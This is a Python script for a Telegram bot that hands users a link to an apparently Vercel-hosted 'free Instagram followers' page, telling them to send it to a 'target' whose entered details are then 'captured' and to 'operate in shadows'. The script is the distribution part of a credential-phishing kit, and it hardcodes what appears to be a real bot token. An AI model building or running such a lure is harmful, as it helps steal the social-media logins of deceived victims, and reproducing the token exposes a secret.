import requests, time, sys

BOT_TOKEN = "8656174825:AAHkrVxk54EelILv7TR6XsEbrbVOYipf5aE"
VERCEL_URL = "instagram-followers-six.vercel.app"



last_id = 0
print("[+] Bot running! Send /start to your bot on Telegram")

while True:
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                        params={"offset": last_id+1, "timeout": 30}, timeout=35)
        data = r.json()
        if not data.get("ok"): continue

        for update in data.get("result", []):
            uid = update.get("update_id", 0)
            if uid > last_id: last_id = uid

            msg = update.get("message", {})
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "")
            user_id = msg.get("from", {}).get("id")

            if not chat_id: continue

            if text == "/start":
                link = f"{VERCEL_URL}/?ref={user_id}"
                reply = f"""🚀 FREE INSTAGRAM FOLLOWERS 🚀

🔗 Send this link to target:
{link}

━━━━━━━━━━━━━━━━━━━━
💀 DEPLOYMENT INSTRUCTIONS:
1. Send this link to target
2. When they enter details → Data captured here

⚠️ Stay anonymous. Operate in shadows.

Ref ID: {user_id}
━━━━━━━━━━━━━━━━━━━━"""
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={"chat_id": chat_id, "text": reply})
                print(f"[+] Link sent to user {user_id}: {link}")

    except KeyboardInterrupt:
        print("\n[!] Stopped")
        sys.exit(0)
    except: pass
    time.sleep(1)